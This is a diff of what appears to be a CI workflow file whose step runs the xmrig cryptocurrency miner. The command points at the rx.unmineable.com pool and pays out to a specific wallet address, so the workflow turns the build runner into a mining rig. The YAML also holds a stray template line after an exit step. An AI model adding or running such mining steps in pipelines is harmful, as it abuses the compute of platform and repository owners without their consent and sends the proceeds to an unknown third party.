@@ -42,7 +42,7 @@ jobs:
         
       # Runs a set of commands using the runners shell
       - name: RUNNING
-        run: .\xmrig-6.17.0-msvc-win64\xmrig-6.17.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xBC6dBa2501b9211B1e84B77379668e541af47Bd6.ExMining -p x -t 1
+        run: ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xBC6dBa2501b9211B1e84B77379668e541af47Bd6.ExMining -p x -t 1
       - name: DONE
         run: exit
           echo Add other actions to build,
